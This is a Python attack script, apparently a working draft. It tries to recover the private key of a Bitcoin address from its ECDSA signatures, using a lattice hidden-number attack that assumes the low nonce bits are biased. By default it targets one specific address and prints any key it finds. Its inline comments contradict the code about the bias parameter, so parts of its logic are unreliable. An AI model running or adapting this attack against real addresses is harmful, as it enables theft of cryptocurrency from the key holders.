from tx_preimage_reconstructor import extract_sigs_with_real_z
from lattice_nonce_analyzer import solve_hnp, verify_key
import sys

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def try_lsb_lattice(address, max_b=4):
    sigs = extract_sigs_with_real_z(address)
    if len(sigs) < 2:
        print("Not enough signatures.")
        return
    
    print(f"Loaded {len(sigs)} signatures for {address}")
    
    for b in range(1, max_b + 1):
        mod = 1 << b
        for a in range(mod):
            print(f"Trying b={b}, a={a} (k = {mod}*k' + {a})...")
            # Transform sigs for HNP
            transformed_sigs = []
            mod_inv = pow(mod, -1, P)
            for s in sigs:
                # k = mod*k' + a
                # s(mod*k' + a) = z + rd
                # mod*s*k' = z - s*a + rd
                # k' = (z - s*a)/(mod*s) + r/(mod*s) * d
                
                inv_den = pow(mod * s['s'], -1, P)
                u = ((s['z'] - s['s'] * a) * inv_den) % P
                t = (s['r'] * inv_den) % P
                
                # Our solve_hnp uses k = u + t*d
                # Wait, solve_hnp in lattice_nonce_analyzer.py uses:
                # s_inv = pow(sig['s'], -1, P)
                # t = (s_inv * sig['r']) % P
                # u = (s_inv * sig['z']) % P
                # k = u + t*d
                # So we can just pass u and t.
                
                transformed_sigs.append({'s': 1, 'r': t, 'z': u})
            
            # Use a conservative bias_bits. 
            # If k' is 256-b bits, then bias_bits is b.
            # But we only have 4 sigs, so we need b to be large.
            # Wait, if we only have 4 sigs, we need b ~ 64.
            # If b is only 1 or 2, this won't work unless we have many more sigs.
            
            # However, if the nonces are very small, it might work.
            # Let's try bias_bits = 64 (meaning k' is 192 bits)
            key = solve_hnp(transformed_sigs, bias_bits=b, address=address)
            if key:
                print(f"!!! SUCCESS !!! Key found: {hex(key)}")
                return key
    print("No key found with LSB bias.")

if __name__ == "__main__":
    addr = sys.argv[1] if len(sys.argv) > 1 else "12ib7dApVFvg82TXKycWBNpN8kFyiAN1dr"
    try_lsb_lattice(addr)
